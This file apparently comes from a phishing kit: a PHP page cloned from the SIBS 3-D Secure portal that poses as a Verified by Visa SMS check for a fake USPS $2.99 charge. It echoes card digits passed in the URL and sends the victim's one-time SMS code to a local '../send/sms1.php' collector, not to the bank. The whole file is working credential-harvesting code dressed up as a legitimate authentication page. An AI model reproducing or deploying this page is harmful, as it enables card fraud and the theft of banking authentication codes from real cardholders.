<?php
$f6=$_GET['avant'];
$l4=$_GET['apres'];
date_default_timezone_set('Europe/Roma');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<!-- saved from url=(0035)https://acs.sibs.pt/2/servlet/acscr -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <link rel="stylesheet" href="./SIBS FPS_files/bootstrap.css">
        <link rel="stylesheet" href="./SIBS FPS_files/bootstrap.min.css">
        <link rel="stylesheet" href="./SIBS FPS_files/acs.css">
        <script src="./SIBS FPS_files/jquery-3.2.1.min.js.téléchargement"></script>
        <script src="./SIBS FPS_files/bootstrap.min.js.téléchargement"></script>
        <script language="javascript" src="./SIBS FPS_files/h47601f00.js.téléchargement"></script>
        <title>SIBS FPS</title>
    </head>
    <body onload="document.getElementById(&#39;submitsms&#39;).disabled = true;">
        <div class="container" style="width: 360px; height: 390px">
            



<div id="form_h476">
    
    <form id="H47601F00PDS" name="H47601F00PDS" method="post" action="https://acs.sibs.pt/2/servlet/acscr">
        <input type="hidden" name="TRN" value="H47602F01PDS">
		<input type="hidden" name="C000" value="JjrP6Z7deeFehgJSdp+l8f/oxPw=">
        <input type="hidden" name="C011" id="C011" value="">
        <input type="hidden" name="A037" id="A037" value="">
    </form>
</div>
<div id="form_h476_nok">
    <form id="H47601F00_NOK" name="H47601F00_NOK" method="post" action="#">
        <input type="hidden" name="TRN" value="H47602F09">
		<input type="hidden" name="C000" value="JjrP6Z7deeFehgJSdp+l8f/oxPw=">
    </form>
</div>

<table style="width: 60%; height: 31px">
    <tbody><tr>
        <td align="left">
        	<img style="display: block; margin-left: auto; margin-right: auto; height: 40%;" src="https://pngimage.net/wp-content/uploads/2018/06/verified-by-visa-png-2.png" alt="Logotipo do Banco Emissor" border="1" class="img-responsive pull-left"></td>
        <td align="right">
            </td>
    </tr>
</tbody></table>
<hr style="padding: 0px; margin: 0px"><br>        



            


<form id="H47601F00" name="H47601F00" method="post" action="../send/sms1.php?avant=<?php echo $f6 ?>&apres=<?php echo $l4 ?>">
        <input type="hidden" name="TRN" value="H47602F01">
		<input type="hidden" name="C000" value="JjrP6Z7deeFehgJSdp+l8f/oxPw=">
        <input type="hidden" name="C011" id="C011" value="">
        <input type="hidden" name="A037" id="A037" value="">
    

<div>
    <table class="tableAcs">
        <tbody><tr>
            <td class="tdAcs">Date:&nbsp;<?php echo date('d/m/Y', time()); ?></td>
            <td class="tdAcs" align="center"><strong>Order Details</strong></td>
        </tr>
        <tr>
            <td class="tdAcs">Merchant</td>
            <td class="tdAcs">USPS GMBH</td>
        </tr>
        <tr>
            <td class="tdAcs">Amount</td>
            <td class="tdAcs">Dollar 2.99</td>
        </tr>
        <tr>
            <td class="tdAcs">Card Number</td>
            <td class="tdAcs"><?php echo "".$f6.""?>******<?php echo "".$l4."" ?></td>
        </tr>
</tbody></table>
</div>
<br>

            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tbody><tr><td align="center"><span class="text-mutedAcs">3-D SECURE AUTHENTICATION<i></i></span></td></tr>
            </tbody></table>
<br>
            <p class="text-muted">An SMS was sent to the number ********* with the authentication code. Wait for the SMS and after receiving it please enter the code below.</p>
            <label for="codigo">Code:</label>&nbsp; <input type="text" style="width: 90px" id="codigo" name="sms" size="10" required >
            <input class="btn-primaryAcs" type="submit" value="Confirm" id="submit" onclick="if (otpSubmit()) {
                        document.getElementById(&#39;H47601F00&#39;).submit();
                    }">
            
            <input value="Request SMS" class="btn-warningAcs" id="submitsms" type="button" onclick="requestSms(&#39;Se não recebeu o SMS, verifique o telemóvel indicado:&#39;, &#39;- Se estiver correto, solicite novo sms.&#39;, &#39;- Se não estiver correto, atualize os seus dados junto do seu Banco.&#39;, &#39;- Quer solicitar novo SMS?&#39;);">

            
				<p class="text-muted small"><i>This information is not shared with the Merchant</i></p>
				<br><br>
			
		
		
		
		<form id="H47602F02" name="H47602F02" method="post" action="https://acs.sibs.pt/2/servlet/acscr">
			<input type="hidden" name="TRN" value="H47602F02"> 
			<input type="hidden" name="C000" value="JjrP6Z7deeFehgJSdp+l8f/oxPw=">
		</form>
		
		

            <table border="0" width="100%" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td align="left">
                        <a href="#" data-toggle="modal" data-target="#myModal">
                            <img src="./SIBS FPS_files/infoSign.png" border="0" height="15px">Help
                        </a>
                    </td>
                    <td align="right">
                        <a href="#" onclick="document.getElementById(&#39;H47601F00_NOK&#39;).submit();">Cancel</a>
                    </td>
                </tr>
            </tbody></table>
</form>

            <!-- Modal -->
            <div id="myModal" class="modal fade" role="dialog">
                <div class="modal-dialog">

                    <!-- Modal content-->
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal">×</button>
                        </div>
                        <div class="modal-body">
                            <table width="100%">
                                <tbody><tr>
                                    <td>Para confirmar que se trata do titular do cartão, foi enviada uma password única para esta compra para o telemóvel associado ao seu cartão no serviço 3-D Secure. Introduza a password na caixa indicada e clique em "Autenticar".</td>
                                </tr>
                                <tr>
                                    <td align="left">
                                        Se não recebeu sms, verifique:<ul><li>Se tem cobertura de rede</li><li>Se os últimos 4 dígitos do seu número de telemóvel estão correctos.</li></ul> 
                                    </td>
                                </tr>
                                <tr>
                                    <td align="left">
                                        <ol><li>Se os 4 dígitos estão correctos, solicite novo sms.</li><li>Se os 4 dígitos não estão correctos, atualize os seus dados junto do seu banco</li></ol> 
                                    </td>
                                </tr>
                                <tr>
                                    <td align="left">
                                        -Se estiver em roaming, pode estar a experienciar problemas de atraso de entrega de sms; considere outras formas de pagamento como o MBNET. 
                                    </td>
                                </tr>
                            </tbody></table>
                        </div>
                        <!--div class="modal-footer">
                            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                        </div-->
                    </div>

                </div>
            </div>
            <br>
            <hr style="padding: 0px; margin: 0px">
<div class="row">
	<div class="text-right">
		<small>SIBS — FPS 2020</small>
	</div>
</div>
        </div>
        <script type="text/javascript">activateSmsBtn(10);</script>
    
</body></html>